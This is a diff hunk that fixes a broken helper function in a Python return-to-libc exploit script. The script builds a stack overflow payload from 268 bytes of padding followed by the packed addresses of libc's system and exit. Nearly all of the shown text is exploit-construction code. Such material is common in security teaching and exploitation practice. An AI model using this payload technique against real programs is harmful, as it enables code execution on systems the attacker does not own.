@@ -67,7 +67,7 @@ exit_addr = libc_base_addr + exit_off
 system_arg = 0x804827d
 #endianess convertion
 def conv(num):
- return struct.pack("<I",numystem + exit + system_arg
+ return struct.pack("<I",num)
 buf = "A" * 268
 buf += conv(system_addr)
 buf += conv(exit_addr)
